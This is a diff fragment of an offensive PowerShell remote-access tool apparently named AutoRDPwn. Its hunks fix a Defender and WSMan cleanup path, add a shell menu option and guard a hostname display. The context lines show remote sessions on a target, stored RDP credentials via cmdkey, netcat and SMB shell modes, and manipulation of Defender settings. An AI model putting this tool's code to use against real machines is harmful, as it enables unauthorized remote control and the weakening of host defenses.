@@ -122,7 +122,7 @@ function Remove-Exclusions {
     $exclusion = Get-MpPreference ; $exclusion.exclusionprocess | % { Remove-MpPreference -ExclusionProcess $_ 2>&1> $null }
     $exclusion = Get-MpPreference ; $exclusion.exclusionpath | % { Remove-MpPreference -ExclusionPath $_ 2>&1> $null }
     $exclusion = Get-MpPreference ; $exclusion.exclusionextension | % { Remove-MpPreference -ExclusionExtension $_ 2>&1> $null }
-    Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Clear-Item -Path WSMan:localhostClientTrustedHosts -Force 2>&1> $null 
+    Set-MpPreference -DisableIOAVProtection 0 2>&1> $null ; Clear-Item -Path WSMan:\localhost\Client\Trustedhosts -Force 2>&1> $null 
     Set-MpPreference -SubmitSamplesConsent 1 2>&1> $null ; Set-MpPreference -MAPSReporting 2 2>&1> $null ; Set-MpPreference -DisableScriptScanning 0 2>&1> $null }
 
     $question = { Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "?" -NoNewLine -ForegroundColor Yellow ; Write-Host "] " -NoNewLine -ForegroundColor Gray }
@@ -349,7 +349,7 @@ function Remove-Exclusions {
         Write-Host "[i] $txt46" -ForegroundColor Green ; $netcat = 'remote' ; Start-Sleep -milliseconds 2000 }
 
         if($shell -like 'X'){ $input = 'x' ; continue }
-        if($shell -in '1','2','3','4','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
+        if($shell -in '1','2','3','4','5','m') { $null } else { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
 
         if($module -like '2') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt9" -ForegroundColor Gray
@@ -658,7 +658,7 @@ function Remove-Exclusions {
 
     Write-Host ; Write-Host "[+] $txt32" -ForegroundColor Blue ; $remoteinfo = invoke-command -session $RDP[0] -scriptblock { [pscustomobject]@{ host = $env:computername ; caption = (Get-WmiObject -class Win32_OperatingSystem).Caption } } ; $hostname = $remoteinfo.host ; $version = $remoteinfo.caption
     if(!$hostname){ $hostname = invoke-command -session $RDP[0] -scriptblock { $env:computername } ; $version = invoke-command -session $RDP[0] -scriptblock { (Get-WmiObject -class Win32_OperatingSystem).Caption }}
-    Write-Host ; Write-Host "[i] $txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray ;  if($hash){ cmdkey /add:$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null }
+    Write-Host ; Write-Host "[i] $txt33" -NoNewLine ; Write-Host $(if($hostname){$hostname.tolower()}) -ForegroundColor Gray ;  if($hash){ cmdkey /add:$computer /user:AutoRDPwn /pass:AutoRDPwn 2>&1> $null }
     $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 
     if($smbshell){ invoke-command -session $RDP[0] -scriptblock { Start-Job -ScriptBlock { 
